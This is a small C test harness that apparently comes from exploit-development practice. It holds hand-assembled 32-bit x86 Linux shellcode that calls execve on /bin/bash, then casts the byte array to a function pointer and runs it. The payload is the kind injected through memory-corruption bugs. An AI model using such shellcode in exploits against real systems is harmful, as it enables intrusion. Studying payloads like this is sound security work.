#include<stdio.h>
#include<string.h>


unsigned char code[] = \
"\xeb\x1a\x5e\x31\xdb\x88\x5e\x09\x89\x76\x0a\x89\x5e\x0e\x8d\x1e\x8d\x4e\x0a\x8d\x56\x0e\x31\xc0\xb0\x0b\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x2f\x41\x42\x42\x42\x42\x43\x43\x43\x43";

void main()
{
	printf("Shellcode Length: %d\n", strlen(code));
	int (*ret)() = (int(*)())code;

	ret();

}
